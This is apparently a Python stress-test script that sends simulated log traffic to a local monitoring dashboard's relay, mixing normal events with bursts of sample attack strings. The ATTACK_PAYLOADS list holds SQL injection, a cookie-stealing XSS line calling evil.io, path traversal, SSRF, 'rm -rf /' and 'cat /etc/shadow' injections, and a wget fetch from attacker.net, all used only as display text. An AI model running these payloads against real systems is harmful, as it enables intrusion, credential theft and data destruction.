#!/usr/bin/env python3
"""
dashboard_stress_test.py
─────────────────────────
Simulates a live network-monitoring feed by:
  1. Opening a TCP server on port 19876 (unused by any other service).
  2. Injecting log lines directly into the relay's HTTP endpoint so the
     dashboard reacts in real time (no C++ backend required).
  3. Firing random "attack bursts" mixed with normal traffic every few
     seconds to exercise CRITICAL / SUCCESS / INFO / WARN / ERROR paths
     and the [PROGRESS] tracking bar.

Usage:
    python3 dashboard_stress_test.py
"""

import asyncio
import json
import random
import socket
import threading
import time
import http.client
import datetime
import signal
import sys

# ── Config ────────────────────────────────────────────────────────────────────
LISTEN_PORT   = 19876          # the local port we "monitor"
RELAY_HOST    = "127.0.0.1"
RELAY_PORT    = 3001
BURST_EVERY   = 4              # seconds between attack bursts
NORMAL_EVERY  = 1.2            # seconds between normal packets
BURST_SIZE    = (5, 14)        # random burst packet count range
TOTAL_SECONDS = 300            # auto-stop after 5 minutes (0 = run forever)

# ── Fake data pools ──────────────────────────────────────────────────────────
NORMAL_IPS = [
    "192.168.1.{i}".format(i=i) for i in range(10, 60)
] + ["10.0.0.{i}".format(i=i) for i in range(1, 30)]

ATTACK_IPS = [
    "203.0.113.{i}".format(i=i) for i in range(1, 50)
] + ["198.51.100.{i}".format(i=i) for i in range(1, 30)]

NORMAL_PAYLOADS = [
    "GET /api/health HTTP/1.1",
    "POST /api/login { user: 'admin' }",
    "WebSocket PING from client",
    "TLS handshake completed",
    "GET /static/app.js HTTP/1.1",
    "DNS lookup: api.internal",
    "TCP SYN from monitoring agent",
    "Health check 200 OK",
    "Metrics scrape completed",
    "gRPC call: /proto.Service/GetStatus",
]

ATTACK_PAYLOADS = [
    "DROP TABLE users; --",
    "admin' OR '1'='1",
    "' UNION SELECT * FROM passwords--",
    "<script>document.location='http://evil.io/steal?c='+document.cookie</script>",
    "../../../etc/passwd",
    "curl http://169.254.169.254/latest/meta-data/",  # SSRF
    "POST /api/exec { cmd: 'rm -rf /' }",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "X-Forwarded-For: 127.0.0.1; cat /etc/shadow",
    "User-Agent: sqlmap/1.6 (https://sqlmap.org)",
    "\x00\x00\x00\x01\x00\x00\x10 HEAP OVERFLOW ATTEMPT",
    "POST /admin/upload multipart; filename='../../../../shell.php'",
    "ping -c 1 attacker.net && wget http://attacker.net/payload",
]

WARN_PAYLOADS = [
    "Rate limit approaching: 980/1000 req/min",
    "Unusual geo-location: login from CN (expected IN)",
    "Brute-force detector: 4 failed logins in 60s",
    "Certificate expiry in 7 days",
    "Memory usage at 78% – threshold 80%",
]

LEVELS  = ["INFO", "SUCCESS", "WARN", "ERROR", "CRITICAL"]
WEIGHTS = [0.40,   0.25,      0.15,   0.10,    0.10]

# ── Helpers ───────────────────────────────────────────────────────────────────

def ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def random_id():
    return '{:06X}'.format(random.randint(0, 0xFFFFFF))

def post_relay(path: str, body: dict):
    """Fire-and-forget POST to the relay."""
    try:
        payload = json.dumps(body)
        conn = http.client.HTTPConnection(RELAY_HOST, RELAY_PORT, timeout=2)
        conn.request("POST", path,
                     body=payload,
                     headers={"Content-Type": "application/json",
                               "Content-Length": str(len(payload))})
        conn.getresponse()
        conn.close()
    except Exception:
        pass  # relay may not be reachable, keep going

def emit_packet(level: str, source_ip: str, payload_text: str):
    """Build a fake log line and send it to relay's ingest endpoint."""
    log_line = f"[{ts()}] [{level}] {source_ip} — {payload_text}"
    post_relay("/api/ingest-log", {
        "line": log_line,
        "level": level,
        "sourceIp": source_ip,
        "payload": payload_text,
        "timestamp": ts(),
        "id": random_id(),
    })
    color = {
        "CRITICAL": "\033[91m",
        "WARN":     "\033[93m",
        "ERROR":    "\033[31m",
        "SUCCESS":  "\033[92m",
        "INFO":     "\033[96m",
    }.get(level, "")
    reset = "\033[0m"
    print(f"  {color}[{level:8s}]{reset} {source_ip:18s} → {payload_text[:60]}")

def emit_progress(step: int, total: int, label: str = "Workflow"):
    pct = int((step / total) * 100)
    log_line = f"[{ts()}] [INFO] [PROGRESS] {pct}% — {label} step {step}/{total}"
    post_relay("/api/ingest-log", {"line": log_line, "level": "INFO",
                                   "sourceIp": "127.0.0.1", "payload": log_line})
    print(f"  \033[94m[PROGRESS]\033[0m {pct:3d}% {label}")

def emit_vitals(cpu: int, ram: int):
    log_line = f"[{ts()}] [METRIC] CPU: {cpu}% | RAM: {ram}%"
    post_relay("/api/ingest-log", {"line": log_line, "level": "METRIC",
                                   "sourceIp": "127.0.0.1", "payload": log_line})

# ── TCP Listener ──────────────────────────────────────────────────────────────

def tcp_listener():
    """Listen on LISTEN_PORT and echo received data to console."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", LISTEN_PORT))
        srv.listen(32)
        print(f"\033[92m[TCP]\033[0m  Listening on port {LISTEN_PORT}\n")
        while True:
            try:
                conn, addr = srv.accept()
                data = conn.recv(4096)
                print(f"  \033[90m[TCP recv]\033[0m {addr[0]}:{addr[1]} → {data[:80]!r}")
                conn.close()
            except Exception:
                break
    except OSError as e:
        print(f"\033[93m[WARN]\033[0m Could not bind port {LISTEN_PORT}: {e}")
    finally:
        srv.close()

# ── Burst generator ───────────────────────────────────────────────────────────

def attack_burst():
    n = random.randint(*BURST_SIZE)
    print(f"\n\033[91m{'─'*60}\033[0m")
    print(f"\033[91m[BURST]\033[0m {n} attack packets incoming!\n")
    for _ in range(n):
        ip      = random.choice(ATTACK_IPS)
        payload = random.choice(ATTACK_PAYLOADS)
        emit_packet("CRITICAL", ip, payload)
        time.sleep(random.uniform(0.08, 0.25))
    print(f"\033[91m{'─'*60}\033[0m\n")

# ── Main loop ─────────────────────────────────────────────────────────────────

def main():
    print("╔══════════════════════════════════════════════════════════╗")
    print("║   AUTOMATION ORCHESTRATOR — Dashboard Stress Test         ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"  Relay target : http://{RELAY_HOST}:{RELAY_PORT}")
    print(f"  Monitor port : {LISTEN_PORT}")
    print(f"  Burst every  : {BURST_EVERY}s   |  Normal every : {NORMAL_EVERY}s")
    print(f"  Auto-stop    : {TOTAL_SECONDS}s (0=forever)\n")

    # check relay reachable
    try:
        conn = http.client.HTTPConnection(RELAY_HOST, RELAY_PORT, timeout=1)
        conn.request("GET", "/api/workflows")
        r = conn.getresponse(); conn.close()
        print(f"  \033[92m✓ Relay reachable\033[0m (GET /api/workflows → {r.status})\n")
    except Exception as e:
        print(f"  \033[93m⚠ Relay not reachable ({e}) — packets will be logged locally only\033[0m\n")

    # start TCP listener in background
    t = threading.Thread(target=tcp_listener, daemon=True)
    t.start()

    start      = time.time()
    last_burst = time.time()
    pkt_count  = 0
    prog_step  = 0
    prog_total = 20

    def handle_exit(sig, frame):
        print(f"\n\033[93m[EXIT]\033[0m Sent {pkt_count} packets in {time.time()-start:.0f}s")
        sys.exit(0)
    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    print("  \033[96mSending live packets… (Ctrl+C to stop)\033[0m\n")

    while True:
        elapsed = time.time() - start
        if TOTAL_SECONDS > 0 and elapsed > TOTAL_SECONDS:
            break

        # ── Attack burst ──────────────────────────────────────────
        if time.time() - last_burst >= BURST_EVERY:
            attack_burst()
            last_burst = time.time()

            # Simulate workflow progress after each burst
            prog_step = min(prog_step + random.randint(1, 3), prog_total)
            emit_progress(prog_step, prog_total, "Sec-Audit Routine")
            if prog_step >= prog_total:
                prog_step = 0
                emit_packet("SUCCESS", "127.0.0.1", "[COMPLETE] Workflow finished successfully")

        # ── Normal traffic ────────────────────────────────────────
        level   = random.choices(LEVELS, WEIGHTS)[0]
        ip      = random.choice(NORMAL_IPS)
        if level == "CRITICAL":
            payload = random.choice(ATTACK_PAYLOADS)
        elif level == "WARN":
            payload = random.choice(WARN_PAYLOADS)
        else:
            payload = random.choice(NORMAL_PAYLOADS)

        emit_packet(level, ip, payload)
        pkt_count += 1

        # ── Vitals pulse every 5 packets ─────────────────────────
        if pkt_count % 5 == 0:
            cpu = random.randint(20, 95)
            ram = random.randint(30, 80)
            emit_vitals(cpu, ram)
            print(f"  \033[90m[VITALS]\033[0m CPU {cpu}%  RAM {ram}%")

        time.sleep(NORMAL_EVERY)

    print(f"\n\033[92m[DONE]\033[0m {pkt_count} packets in {time.time()-start:.0f}s")

if __name__ == "__main__":
    main()
